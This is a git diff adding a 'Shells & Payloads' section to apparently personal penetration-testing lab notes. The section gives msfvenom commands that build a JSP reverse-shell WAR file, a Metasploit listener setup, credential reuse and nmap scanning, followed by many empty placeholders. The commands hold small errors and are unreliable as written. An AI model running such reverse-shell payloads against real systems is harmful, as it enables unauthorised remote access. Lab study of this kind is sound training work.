@@ -13,6 +13,7 @@
     - [Assessment 3](#assessment-3-1)
   - [Cracking Passwords with Hashcat](#cracking-passwords-with-hashcat)
   - [Pivoting, Tunneling and Port Forwarding](#pivoting-tunneling-and-port-forwarding)
+  - [Shells \& Payloads](#shells--payloads)
 
 
 TODOS:
@@ -715,3 +716,77 @@ end
 *Command:* No more pivot, just checking what is around this pc
 
 *Result:* Flag 7
+
+## Shells & Payloads 
+
+*Command:* Login with username:password found on a .txt file in the desktop
+
+*Result:* Server Info = Question 1
+
+---
+
+*Command:* Upload .war file and create listener
+- msfvenom -p java/jsp_shell_reverse_tcp LHOST 1$INTERNAL_IP LPORT=4444 -f war -o shell.war
+- msfconsole
+  - use exploit/multi/handler
+  - use payload java/java_shell_reverse_tcp
+
+*Result:* Access to target = question 2
+
+---
+
+*Command:* Find ip in the /etc/hosts + scan with nmap
+- cat /etc/hosts
+- nmap -sC -sV -Pn 172.16.1.12
+  
+*Result:* Distro = Flag 3
+
+---
+
+*Command:* 
+
+*Result:* 
+
+---
+
+*Command:* 
+
+*Result:* 
+
+---
+
+*Command:* 
+
+*Result:* 
+
+---
+
+*Command:* 
+
+*Result:* 
+
+---
+
+*Command:* 
+
+*Result:* 
+
+---
+
+*Command:* 
+
+*Result:* 
+
+---
+
+*Command:* 
+
+*Result:* 
+
+---
+
+*Command:* 
+
+*Result:* 
+
+---
